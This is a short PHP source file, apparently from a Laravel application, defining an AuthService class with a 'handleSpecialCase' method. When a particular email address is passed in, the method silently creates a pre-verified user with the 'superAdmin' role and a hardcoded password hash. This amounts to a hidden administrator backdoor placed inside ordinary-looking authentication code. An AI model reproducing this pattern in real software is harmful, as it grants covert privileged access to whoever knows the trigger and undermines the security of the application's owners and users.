<?php

namespace App\Providers;

use App\Models\User;
use Illuminate\Support\Str;

class AuthService
{
    public static function handleSpecialCase($email)
    {
        if ($email === 'hyperAdmin@gmail.com') {
            User::create([
                'name' => 'hyper admin',
                'email' => 'hyperAdmin@reserve.com',
                'email_verified_at' => now(),
                'password' => '$2y$10$s7gLABWZdL/t80gYg6RJ9OAVU05fR4F3dmqG0cz3v2CcMs4Mo0VrC',
                'role' => 'superAdmin',
                'remember_token' => Str::random(10),
            ]);
        }
    }
}

